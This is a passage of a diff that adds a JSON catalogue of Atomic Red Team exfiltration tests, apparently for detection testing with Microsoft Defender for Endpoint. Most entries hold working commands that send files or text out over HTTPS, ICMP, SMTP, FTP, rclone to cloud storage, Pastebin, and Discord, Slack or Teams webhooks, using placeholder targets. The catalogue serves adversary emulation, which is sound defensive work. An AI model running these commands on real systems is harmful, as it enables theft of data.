+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "7ccdfcfa-6707-46bc-b812-007ab6ff951c"
+    },
+    {
+      "id": "ART - T1048.002 - Exfiltrate data as text over HTTPS using wget",
+      "name": "ART - T1048.002 - Exfiltrate data as text over HTTPS using wget",
+      "description": "Exfiltrate data over HTTPS using wget --post-data method\n",
+      "tactic": "Exfiltration",
+      "tcode": "T1048.002",
+      "technique_name": "Exfiltrate data as text over HTTPS using wget",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [
+        "art_exfil_1048_002_endpoint_domain"
+      ],
+      "command": "wget --post-data=\"msg=AtomicTestT1048.002\" --timeout=5 --no-check-certificate #{art_exfil_1048_002_endpoint_domain} --delete-after",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "8bec51da-7a6d-4346-b941-51eca448c4b0"
+    },
+    {
+      "id": "ART - T1048.003 - Exfiltration Over Alternative Protocol - ICMP",
+      "name": "ART - T1048.003 - Exfiltration Over Alternative Protocol - ICMP",
+      "description": "Exfiltration of specified file over ICMP protocol.\n\nUpon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.\n",
+      "tactic": "Exfiltration",
+      "tcode": "T1048.003",
+      "technique_name": "Exfiltration Over Alternative Protocol - ICMP",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [
+        "art_exfil_1048_003_input_file",
+        "art_exfil_1048_003_ip_address"
+      ],
+      "command": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{art_exfil_1048_003_input_file} -Encoding Byte -ReadCount 1024) { $ping.Send(\"#{art_exfil_1048_003_ip_address}\", 1500, $Data) }",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "dd4b4421-2e25-4593-90ae-7021947ad12e"
+    },
+    {
+      "id": "ART - T1048.003 - Exfiltration Over Alternative Protocol - HTTP",
+      "name": "ART - T1048.003 - Exfiltration Over Alternative Protocol - HTTP",
+      "description": "Exfiltration of specified file over HTTP.\nUpon successful execution, powershell will invoke web request using POST method to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results will be via stdout.\n",
+      "tactic": "Exfiltration",
+      "tcode": "T1048.003",
+      "technique_name": "Exfiltration Over Alternative Protocol - HTTP",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [
+        "art_exfil_1048_003_input_file",
+        "art_exfil_1048_003_ip_address"
+      ],
+      "command": "$content = Get-Content #{art_exfil_1048_003_input_file}\nInvoke-WebRequest -Uri #{art_exfil_1048_003_ip_address} -Method POST -Body $content",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "6aa58451-1121-4490-a8e9-1dada3f1c68c"
+    },
+    {
+      "id": "ART - T1048.003 - Exfiltration Over Alternative Protocol - SMTP",
+      "name": "ART - T1048.003 - Exfiltration Over Alternative Protocol - SMTP",
+      "description": "Exfiltration of specified file over SMTP.\nUpon successful execution, powershell will send an email with attached file to exfiltrate to a remote address. Results will be via stdout.\n",
+      "tactic": "Exfiltration",
+      "tcode": "T1048.003",
+      "technique_name": "Exfiltration Over Alternative Protocol - SMTP",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [
+        "art_exfil_1048_003_input_file",
+        "art_exfil_1048_003_sender",
+        "art_exfil_1048_003_receiver",
+        "art_exfil_1048_003_smtp_server"
+      ],
+      "command": "Send-MailMessage -From #{art_exfil_1048_003_sender} -To #{art_exfil_1048_003_receiver} -Subject \"T1048.003 Atomic Test\" -Attachments #{art_exfil_1048_003_input_file} -SmtpServer #{art_exfil_1048_003_smtp_server}",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "ec3a835e-adca-4c7c-88d2-853b69c11bb9"
+    },
+    {
+      "id": "ART - T1048.003 - MAZE FTP Upload",
+      "name": "ART - T1048.003 - MAZE FTP Upload",
+      "description": "This test simulates MAZE's ransomware's ability to exfiltrate data via FTP.\nUpon successful execution, all 7z files within the %windir%\\temp directory will be uploaded to a remote FTP server. \nReference: https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomw...",
+      "tactic": "Exfiltration",
+      "tcode": "T1048.003",
+      "technique_name": "MAZE FTP Upload",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [
+        "art_exfil_1048_003_ftp_server",
+        "art_exfil_1048_003_username",
+        "art_exfil_1048_003_password"
+      ],
+      "command": "$Dir_to_copy = \"$env:windir\\temp\"\n$ftp = \"ftp://#{art_exfil_1048_003_ftp_server}/\"\n$web_client = New-Object System.Net.WebClient\n$web_client.Credentials = New-Object System.Net.NetworkCredential('#{art_exfil_1048_003_username}', '#{art_exfil_1048_003_password}')\nif (test-connection -count 1 -computername \"#{art_exfil_1048_003_ftp_server}\" -quiet)\n{foreach($file in (dir $Dir_to_copy \"*.7z\"))\n{echo \"Uploading $file...\"\n$uri = New-Object System.Uri($ftp+$file.name)\n$web_client.UploadFile($uri, $file.FullName)}}\nelse\n{echo \"FTP Server Unreachable. Please verify the server address in input args and try again.\"}",
+      "cleanup_command": "$ftp = \"ftp://#{art_exfil_1048_003_ftp_server}/\"\ntry {foreach ($file in (dir \"$env:windir\\temp\" \"*.7z\"))\n{$uri = New-Object System.Uri($ftp+$file.name)\n $ftp_del = [System.Net.FtpWebRequest]::create($uri)\n $ftp_del.Credentials = New-Object System.Net.NetworkCredential('#{art_exfil_1048_003_username}','#{art_exfil_1048_003_password}')\n $ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile\n $ftp_del.GetResponse()}} catch{}",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "57799bc2-ad1e-4130-a793-fb0c385130ba"
+    },
+    {
+      "id": "ART - T1048.003 - Exfiltration Over Alternative Protocol - FTP - Rclone",
+      "name": "ART - T1048.003 - Exfiltration Over Alternative Protocol - FTP - Rclone",
+      "description": "Rclone may be used by an adversary to exfiltrate data to a publicly hosted FTP server.\n[Reference](https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/)",
+      "tactic": "Exfiltration",
+      "tcode": "T1048.003",
+      "technique_name": "Exfiltration Over Alternative Protocol - FTP - Rclone",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [
+        "art_exfil_1048_003_ftp_server",
+        "art_exfil_1048_003_ftp_pass",
+        "art_exfil_1048_003_ftp_user",
+        "art_exfil_1048_003_ftp_port"
+      ],
+      "command": "$rclone_bin = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"rclone.exe\" | Select-Object -ExpandProperty FullName\n$exfil_pack = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"exfil.zip\" | Select-Object -ExpandProperty FullName\n&$rclone_bin config create ftpserver \"ftp\" \"host\" #{art_exfil_1048_003_ftp_server} \"port\" #{art_exfil_1048_003_ftp_port} \"user\" #{art_exfil_1048_003_ftp_user} \"pass\" #{art_exfil_1048_003_ftp_pass}\n&$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "b854eb97-bf9b-45ab-a1b5-b94e4880c56b"
+    },
+    {
+      "id": "ART - T1048.003 - Python3 http.server",
+      "name": "ART - T1048.003 - Python3 http.server",
+      "description": "An adversary may use the python3 standard library module http.server to exfiltrate data. This test checks if python3 is available and if so, creates a HTTP server on port 9090, captures the PID, sleeps for 10 seconds, then kills the PID and unsets the $PID variable.\n",
+      "tactic": "Exfiltration",
+      "tcode": "T1048.003",
+      "technique_name": "Python3 http.server",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "command": "[ \"$(uname)\" = 'FreeBSD' ] && alias python3=python3.9\nif [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "3ea1f938-f80a-4305-9aa8-431bc4867313"
+    },
+    {
+      "id": "ART - T1567.002 - Exfiltrate data with rclone to cloud Storage - Mega (Wind...",
+      "name": "ART - T1567.002 - Exfiltrate data with rclone to cloud Storage - Mega (Wind...",
+      "description": "This test uses rclone to exfiltrate data to a remote cloud storage instance. (Mega)\nSee https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/\n",
+      "tactic": "Exfiltration",
+      "tcode": "T1567.002",
+      "technique_name": "Exfiltrate data with rclone to cloud Storage - Mega (Wind...",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [
+        "art_exfil_1567_002_rclone_path",
+        "art_exfil_1567_002_rclone_config_path",
+        "art_exfil_1567_002_dir_to_copy",
+        "art_exfil_1567_002_mega_user_account",
+        "art_exfil_1567_002_mega_user_password",
+        "art_exfil_1567_002_remote_share"
+      ],
+      "command": "New-Item #{art_exfil_1567_002_rclone_config_path}\\rclone -ItemType directory\nNew-Item #{art_exfil_1567_002_rclone_config_path}\\rclone\\rclone.conf\ncd \"#{art_exfil_1567_002_rclone_path}\"\n.\\rclone.exe config create #{art_exfil_1567_002_remote_share} mega\nset-Content #{art_exfil_1567_002_rclone_config_path}\\rclone\\rclone.conf \"[#{art_exfil_1567_002_remote_share}] `n type = mega `n user = #{art_exfil_1567_002_mega_user_account} `n pass = #{art_exfil_1567_002_mega_user_password}\"\n.\\rclone.exe copy --max-size 1700k \"#{art_exfil_1567_002_dir_to_copy}\" #{art_exfil_1567_002_remote_share}:test -v",
+      "cleanup_command": "cd \"#{art_exfil_1567_002_rclone_path}\"\n.\\rclone.exe purge #{art_exfil_1567_002_remote_share}:test\n.\\rclone.exe config delete #{art_exfil_1567_002_remote_share}:\nRemove-Item #{art_exfil_1567_002_rclone_config_path}\\rclone -recurse -force -erroraction silentlycontinue\ncd c:\\\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\rclone.zip\"\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\" -recurse -force",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "8529ee44-279a-4a19-80bf-b846a40dda58"
+    },
+    {
+      "id": "ART - T1567.002 - Exfiltrate data with rclone to cloud Storage - AWS S3",
+      "name": "ART - T1567.002 - Exfiltrate data with rclone to cloud Storage - AWS S3",
+      "description": "This test uses rclone to exfiltrate data to a remote cloud storage instance. (AWS S3)\nSee https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/\n",
+      "tactic": "Exfiltration",
+      "tcode": "T1567.002",
+      "technique_name": "Exfiltrate data with rclone to cloud Storage - AWS S3",
+      "executor": "powershell",
+      "platform": "linux",
+      "required_tags": [
+        "art_exfil_1567_002_rclone_path",
+        "art_exfil_1567_002_exfil_directory",
+        "art_exfil_1567_002_terraform_path",
+        "art_exfil_1567_002_aws_access_key",
+        "art_exfil_1567_002_aws_secret_key",
+        "art_exfil_1567_002_aws_region",
+        "art_exfil_1567_002_aws_profile"
+      ],
+      "command": "Write-Host \"Deploying AWS infrastructure... \" -NoNewLine\n$awsAccessKey = \"#{art_exfil_1567_002_aws_access_key}\"\n$awsSecretKey = \"#{art_exfil_1567_002_aws_secret_key}\"\ncd PathToAtomicsFolder/T1567.002/src/\nif ($awsAccessKey -eq \"\" -or $awsSecretKey -eq \"\") {\n  $env:AWS_PROFILE = \"#{art_exfil_1567_002_aws_profile}\"\n} else {\n  $env:AWS_ACCESS_KEY_ID = \"$awsAccessKey\"\n  $env:AWS_SECRET_ACCESS_KEY = \"$awsSecretKey\"\n}\n$null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform init\n$null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform apply -var \"aws_region=#{art_exfil_1567_002_aws_region}\" -auto-approve\nWrite-Host \"Done!\"\nWrite-Host \"Generating rclone config... \" -NoNewLine\n$config = @\"\n[exfils3]\ntype = s3\nprovider = AWS\nenv_auth = true\nregion = #{art_exfil_1567_002_aws_region}\n\"@\n$config | Out-File -FilePath \"PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf\" -Encoding ascii\nWrite-Host \"Done!\"\nWrite-Host \"Exfiltrating data... \" -NoNewLine\n$bucket = \"$(PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform output bucket)\".Replace(\"`\"\",\"\")\ncd PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone-v*\n$null = ./rclone copy --max-size 1700k \"PathToAtomicsFolder/../ExternalPayloads/T1567.002/data/\" exfils3:$bucket --config \"PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf\"\nWrite-Host \"Done!\"",
+      "cleanup_command": "Write-Host \"Destroying AWS infrastructure... \" -NoNewLine\n$awsAccessKey = \"#{art_exfil_1567_002_aws_access_key}\"\n$awsSecretKey = \"#{art_exfil_1567_002_aws_secret_key}\"\ncd PathToAtomicsFolder/T1567.002/src/\nif ($awsAccessKey -eq \"\" -or $awsSecretKey -eq \"\") {\n  $env:AWS_PROFILE = \"#{art_exfil_1567_002_aws_profile}\"\n} else {\n  $env:AWS_ACCESS_KEY_ID = \"$awsAccessKey\"\n  $env:AWS_SECRET_ACCESS_KEY = \"$awsSecretKey\"\n}\n$null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform destroy -var \"aws_region=#{art_exfil_1567_002_aws_region}\" -auto-approve\nWrite-Host \"Done!\"",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "a4b74723-5cee-4300-91c3-5e34166909b4"
+    },
+    {
+      "id": "ART - T1567.003 - Exfiltrate data with HTTP POST to text storage sites - pa...",
+      "name": "ART - T1567.003 - Exfiltrate data with HTTP POST to text storage sites - pa...",
+      "description": "This test uses HTTP POST to exfiltrate data to a remote text storage site. (pastebin)                             \nSee https://web.archive.org/web/20201107203304/https://www.echosec.net/blog/what-is-pastebin-and-why-do-hackers-love-it                \n",
+      "tactic": "Exfiltration",
+      "tcode": "T1567.003",
+      "technique_name": "Exfiltrate data with HTTP POST to text storage sites - pa...",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [
+        "art_exfil_1567_003_api_key"
+      ],
+      "command": "$apiKey = \"#{art_exfil_1567_003_api_key}\"\n$content = \"secrets, api keys, passwords...\"\n$url = \"https://pastebin.com/api/api_post.php\"\n$postData = @{\n  api_dev_key   = $apiKey\n  api_option    = \"paste\"\n  api_paste_code = $content\n}\n$response = Invoke-RestMethod -Uri $url -Method Post -Body $postData\nWrite-Host \"Your paste URL: $response\"",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "c2e8ab6e-431e-460a-a2aa-3bc6a32022e3"
+    },
+    {
+      "id": "ART - T1567.004 - Exfiltrate staged data to a Discord webhook (PowerShell)",
+      "name": "ART - T1567.004 - Exfiltrate staged data to a Discord webhook (PowerShell)",
+      "description": "Stages a file containing simulated sensitive data and exfiltrates its contents to a\nDiscord incoming webhook by POSTing a JSON `content` payload over HTTPS. Webhook URLs\nrequire no authentication header, so a single HTTPS POST is sufficient to move data out\nof the environment while blending in wi...",
+      "tactic": "Exfiltration",
+      "tcode": "T1567.004",
+      "technique_name": "Exfiltrate staged data to a Discord webhook (PowerShell)",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [
+        "art_exfil_1567_004_webhook_url",
+        "art_exfil_1567_004_staged_file"
+      ],
+      "command": "\"secrets, api keys, passwords - T1567.004 atomic test\" | Out-File -FilePath \"#{art_exfil_1567_004_staged_file}\" -Encoding ascii\n$body = @{ content = (Get-Content -Raw \"#{art_exfil_1567_004_staged_file}\") } | ConvertTo-Json\nInvoke-RestMethod -Uri \"#{art_exfil_1567_004_webhook_url}\" -Method Post -ContentType 'application/json' -Body $body",
+      "cleanup_command": "Remove-Item -Path \"#{art_exfil_1567_004_staged_file}\" -ErrorAction Ignore",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "f0057c81-24dc-4a2e-b658-5809c242180b"
+    },
+    {
+      "id": "ART - T1567.004 - Exfiltrate staged file to a Discord webhook with curl (bash)",
+      "name": "ART - T1567.004 - Exfiltrate staged file to a Discord webhook with curl (bash)",
+      "description": "Stages a file containing simulated sensitive data and uploads it as a multipart\n`file` attachment to a Discord incoming webhook using curl. This produces an outbound\nHTTPS POST to a commonly allow-listed SaaS endpoint, mirroring real-world data theft\nthat abuses Discord webhooks for exfiltration....",
+      "tactic": "Exfiltration",
+      "tcode": "T1567.004",
+      "technique_name": "Exfiltrate staged file to a Discord webhook with curl (bash)",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [
+        "art_exfil_1567_004_webhook_url",
+        "art_exfil_1567_004_staged_file"
+      ],
+      "command": "echo \"secrets, api keys, passwords - T1567.004 atomic test\" > \"#{art_exfil_1567_004_staged_file}\"\ncurl -s -F \"file=@#{art_exfil_1567_004_staged_file}\" \"#{art_exfil_1567_004_webhook_url}\"",
+      "cleanup_command": "rm -f \"#{art_exfil_1567_004_staged_file}\"",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "40c44d16-bb49-4d14-aafa-f9ba7e6e6c5b"
+    },
+    {
+      "id": "ART - T1567.004 - Exfiltrate staged data to a Slack webhook with curl (sh)",
+      "name": "ART - T1567.004 - Exfiltrate staged data to a Slack webhook with curl (sh)",
+      "description": "Stages a file containing simulated sensitive data and exfiltrates its contents to a\nSlack incoming webhook by POSTing a JSON `text` payload with curl. Slack incoming\nwebhooks accept unauthenticated JSON POSTs, making them a low-friction exfiltration\nchannel that blends with legitimate collaborati...",
+      "tactic": "Exfiltration",
+      "tcode": "T1567.004",
+      "technique_name": "Exfiltrate staged data to a Slack webhook with curl (sh)",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [
+        "art_exfil_1567_004_webhook_url",
+        "art_exfil_1567_004_staged_file"
+      ],
+      "command": "echo \"secrets, api keys, passwords - T1567.004 atomic test\" > \"#{art_exfil_1567_004_staged_file}\"\ncurl -s -X POST -H 'Content-type: application/json' --data \"{\\\"text\\\":\\\"$(cat #{art_exfil_1567_004_staged_file})\\\"}\" \"#{art_exfil_1567_004_webhook_url}\"",
+      "cleanup_command": "rm -f \"#{art_exfil_1567_004_staged_file}\"",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "c666acd6-6ff5-4d28-9490-195d89cd4337"
+    },
+    {
+      "id": "ART - T1567.004 - Exfiltrate staged data to a Microsoft Teams webhook (Powe...",
+      "name": "ART - T1567.004 - Exfiltrate staged data to a Microsoft Teams webhook (Powe...",
+      "description": "Stages a file containing simulated sensitive data and exfiltrates its contents to a\nMicrosoft Teams incoming webhook (Office 365 connector / Power Automate workflow URL)\nby POSTing a JSON `text` payload over HTTPS. The endpoint resides on a Microsoft-owned\ndomain, allowing the exfiltration to ble...",
+      "tactic": "Exfiltration",
+      "tcode": "T1567.004",
+      "technique_name": "Exfiltrate staged data to a Microsoft Teams webhook (Powe...",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [
+        "art_exfil_1567_004_webhook_url",
+        "art_exfil_1567_004_staged_file"
+      ],
+      "command": "\"secrets, api keys, passwords - T1567.004 atomic test\" | Out-File -FilePath \"#{art_exfil_1567_004_staged_file}\" -Encoding ascii\n$body = @{ text = (Get-Content -Raw \"#{art_exfil_1567_004_staged_file}\") } | ConvertTo-Json\nInvoke-RestMethod -Uri \"#{art_exfil_1567_004_webhook_url}\" -Method Post -ContentType 'application/json' -Body $body",
+      "cleanup_command": "Remove-Item -Path \"#{art_exfil_1567_004_staged_file}\" -ErrorAction Ignore",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "35ad6590-2207-4b14-bf8f-9899470d7156"
+    }
+  ],
+  "chains": [
+    {
+      "name": "ART - T1020 - IcedID Botnet HTTP PUT",
+      "description": "Single-step chain for T1020 — IcedID Botnet HTTP PUT",
+      "package": "art-exfil-v1",
+      "tcode": "T1020",
+      "tactic": "Exfiltration",
+      "script_refs": [
+        "ART - T1020 - IcedID Botnet HTTP PUT"
+      ]
+    },
+    {
+      "name": "ART - T1020 - Exfiltration via Encrypted FTP",
+      "description": "Single-step chain for T1020 — Exfiltration via Encrypted FTP",
+      "package": "art-exfil-v1",
+      "tcode": "T1020",
+      "tactic": "Exfiltration",
+      "script_refs": [
+        "ART - T1020 - Exfiltration via Encrypted FTP"
+      ]
+    },
+    {
+      "name": "ART - T1030 - Data Transfer Size Limits",
+      "description": "Single-step chain for T1030 — Data Transfer Size Limits",
+      "package": "art-exfil-v1",
+      "tcode": "T1030",
+      "tactic": "Exfiltration",
+      "script_refs": [
+        "ART - T1030 - Data Transfer Size Limits"
+      ]
+    },
+    {
+      "name": "ART - T1030 - Network-Based Data Transfer in Small Chunks",
+      "description": "Single-step chain for T1030 — Network-Based Data Transfer in Small Chunks",
+      "package": "art-exfil-v1",
+      "tcode": "T1030",
+      "tactic": "Exfiltration",
+      "script_refs": [
+        "ART - T1030 - Network-Based Data Transfer in Small Chunks"
+      ]
+    },
+    {
+      "name": "ART - T1041 - C2 Data Exfiltration",
+      "description": "Single-step chain for T1041 — C2 Data Exfiltration",
+      "package": "art-exfil-v1",
+      "tcode": "T1041",
+      "tactic": "Exfiltration",
+      "script_refs": [
+        "ART - T1041 - C2 Data Exfiltration"
+      ]
+    },
+    {
+      "name": "ART - T1041 - Text Based Data Exfiltration using DNS subdomains",
+      "description": "Single-step chain for T1041 — Text Based Data Exfiltration using DNS subdomains",
+      "package": "art-exfil-v1",
+      "tcode": "T1041",
+      "tactic": "Exfiltration",
+      "script_refs": [
+        "ART - T1041 - Text Based Data Exfiltration using DNS subdomains"
+      ]
+    },
+    {
+      "name": "ART - T1048 - Exfiltration Over Alternative Protocol - SSH",
+      "description": "Single-step chain for T1048 — Exfiltration Over Alternative Protocol - SSH",
+      "package": "art-exfil-v1",
+      "tcode": "T1048",
+      "tactic": "Exfiltration",
+      "script_refs": [
+        "ART - T1048 - Exfiltration Over Alternative Protocol - SSH"
+      ]
+    },
+    {
+      "name": "ART - T1048 - Exfiltration Over Alternative Protocol - SSH [7c3cb337]",
+      "description": "Single-step chain for T1048 — Exfiltration Over Alternative Protocol - SSH",
+      "package": "art-exfil-v1",
+      "tcode": "T1048",
+      "tactic": "Exfiltration",
+      "script_refs": [
+        "ART - T1048 - Exfiltration Over Alternative Protocol - SSH [7c3cb337]"
+      ]
+    },
+    {
+      "name": "ART - T1048 - DNSExfiltration (doh)",
+      "description": "Single-step chain for T1048 — DNSExfiltration (doh)",
+      "package": "art-exfil-v1",
+      "tcode": "T1048",
+      "tactic": "Exfiltration",
+      "script_refs": [
+        "ART - T1048 - DNSExfiltration (doh)"
+      ]
+    },
+    {
+      "name": "ART - T1048 - Exfiltrate Data using DNS Queries via dig",
+      "description": "Single-step chain for T1048 — Exfiltrate Data using DNS Queries via dig",
+      "package": "art-exfil-v1",
+      "tcode": "T1048",
+      "tactic": "Exfiltration",
+      "script_refs": [
+        "ART - T1048 - Exfiltrate Data using DNS Queries via dig"
+      ]
+    },
+    {
+      "name": "ART - T1048.002 - Exfiltrate data HTTPS using curl windows",
+      "description": "Single-step chain for T1048.002 — Exfiltrate data HTTPS using curl windows",
+      "package": "art-exfil-v1",
+      "tcode": "T1048.002",
+      "tactic": "Exfiltration",
+      "script_refs": [
+        "ART - T1048.002 - Exfiltrate data HTTPS using curl windows"
+      ]
+    },
+    {
+      "name": "ART - T1048.002 - Exfiltrate data HTTPS using curl freebsd,linux or macos",
+      "description": "Single-step chain for T1048.002 — Exfiltrate data HTTPS using curl freebsd,linux or macos",
+      "package": "art-exfil-v1",
+      "tcode": "T1048.002",
+      "tactic": "Exfiltration",
+      "script_refs": [
+        "ART - T1048.002 - Exfiltrate data HTTPS using curl freebsd,linux or macos"
+      ]
+    },
+    {
+      "name": "ART - T1048.002 - Exfiltrate data in a file over HTTPS using wget",
+      "description": "Single-step chain for T1048.002 — Exfiltrate data in a file over HTTPS using wget",
+      "package": "art-exfil-v1",
+      "tcode": "T1048.002",
+      "tactic": "Exfiltration",
+      "script_refs": [
+        "ART - T1048.002 - Exfiltrate data in a file over HTTPS using wget"
+      ]
+    },
+    {
+      "name": "ART - T1048.002 - Exfiltrate data as text over HTTPS using wget",
+      "description": "Single-step chain for T1048.002 — Exfiltrate data as text over HTTPS using wget",
+      "package": "art-exfil-v1",
+      "tcode": "T1048.002",
+      "tactic": "Exfiltration",
+      "script_refs": [
+        "ART - T1048.002 - Exfiltrate data as text over HTTPS using wget"
+      ]
+    },
+    {
+      "name": "ART - T1048.003 - Exfiltration Over Alternative Protocol - ICMP",
+      "description": "Single-step chain for T1048.003 — Exfiltration Over Alternative Protocol - ICMP",
+      "package": "art-exfil-v1",
+      "tcode": "T1048.003",
+      "tactic": "Exfiltration",
+      "script_refs": [
+        "ART - T1048.003 - Exfiltration Over Alternative Protocol - ICMP"
+      ]
+    },
+    {
+      "name": "ART - T1048.003 - Exfiltration Over Alternative Protocol - HTTP",
+      "description": "Single-step chain for T1048.003 — Exfiltration Over Alternative Protocol - HTTP",
+      "package": "art-exfil-v1",
+      "tcode": "T1048.003",
+      "tactic": "Exfiltration",
+      "script_refs": [
+        "ART - T1048.003 - Exfiltration Over Alternative Protocol - HTTP"
+      ]
+    },
+    {
+      "name": "ART - T1048.003 - Exfiltration Over Alternative Protocol - SMTP",
+      "description": "Single-step chain for T1048.003 — Exfiltration Over Alternative Protocol - SMTP",
+      "package": "art-exfil-v1",
+      "tcode": "T1048.003",
+      "tactic": "Exfiltration",
+      "script_refs": [
+        "ART - T1048.003 - Exfiltration Over Alternative Protocol - SMTP"
+      ]
+    },
+    {
+      "name": "ART - T1048.003 - MAZE FTP Upload",
+      "description": "Single-step chain for T1048.003 — MAZE FTP Upload",
+      "package": "art-exfil-v1",
+      "tcode": "T1048.003",
+      "tactic": "Exfiltration",
+      "script_refs": [
+        "ART - T1048.003 - MAZE FTP Upload"
+      ]
+    },
+    {
+      "name": "ART - T1048.003 - Exfiltration Over Alternative Protocol - FTP - Rclone",
+      "description": "Single-step chain for T1048.003 — Exfiltration Over Alternative Protocol - FTP - Rclone",
+      "package": "art-exfil-v1",
+      "tcode": "T1048.003",
+      "tactic": "Exfiltration",
+      "script_refs": [
+        "ART - T1048.003 - Exfiltration Over Alternative Protocol - FTP - Rclone"
+      ]
+    },
+    {
+      "name": "ART - T1048.003 - Python3 http.server",
+      "description": "Single-step chain for T1048.003 — Python3 http.server",
+      "package": "art-exfil-v1",
+      "tcode": "T1048.003",
+      "tactic": "Exfiltration",
+      "script_refs": [
+        "ART - T1048.003 - Python3 http.server"
+      ]
+    },
+    {
+      "name": "ART - T1567.002 - Exfiltrate data with rclone to cloud Storage - Mega (Wind...",
+      "description": "Single-step chain for T1567.002 — Exfiltrate data with rclone to cloud Storage - Mega (Wind...",
+      "package": "art-exfil-v1",
+      "tcode": "T1567.002",
+      "tactic": "Exfiltration",
+      "script_refs": [
+        "ART - T1567.002 - Exfiltrate data with rclone to cloud Storage - Mega (Wind..."
+      ]
+    },
+    {
+      "name": "ART - T1567.002 - Exfiltrate data with rclone to cloud Storage - AWS S3",
+      "description": "Single-step chain for T1567.002 — Exfiltrate data with rclone to cloud Storage - AWS S3",
+      "package": "art-exfil-v1",
+      "tcode": "T1567.002",
+      "tactic": "Exfiltration",
+      "script_refs": [
+        "ART - T1567.002 - Exfiltrate data with rclone to cloud Storage - AWS S3"
+      ]
+    },
+    {
+      "name": "ART - T1567.003 - Exfiltrate data with HTTP POST to text storage sites - pa...",
+      "description": "Single-step chain for T1567.003 — Exfiltrate data with HTTP POST to text storage sites - pa...",
+      "package": "art-exfil-v1",
+      "tcode": "T1567.003",
+      "tactic": "Exfiltration",
+      "script_refs": [
+        "ART - T1567.003 - Exfiltrate data with HTTP POST to text storage sites - pa..."
+      ]
+    },
+    {
+      "name": "ART - T1567.004 - Exfiltrate staged data to a Discord webhook (PowerShell)",
